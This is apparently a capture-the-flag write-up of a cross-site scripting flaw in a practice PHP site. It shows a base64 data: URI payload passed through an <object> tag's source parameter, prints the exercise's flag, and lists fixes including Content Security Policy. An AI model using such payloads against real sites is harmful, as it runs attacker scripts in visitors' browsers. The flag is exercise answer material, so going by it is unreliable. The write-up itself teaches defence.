# Reproduction:
Go to the page http://127.0.0.1:8000/index.php?page=media&src=nsa

When we take a look a the html on this page we can see
<object data="http://10.0.2.15/images/nsa_prism.jpg"></object>

We disguise a script command using type declaration.
`src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

And the flag appears:
`928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

# Problem:
Object tags are usualy used to inject external content into the page.
But it can run different content type as images or scripts.

# Solution:
- Do not use object tags.
Use <img> if the target loaded file is an image.
- Validate and sanitize URL.
Use only known image extensions, escape special chars.
- Use a Content Security Policy (CSP)
CSP allow us to define a security policy for browsers, using allowed sources to load content.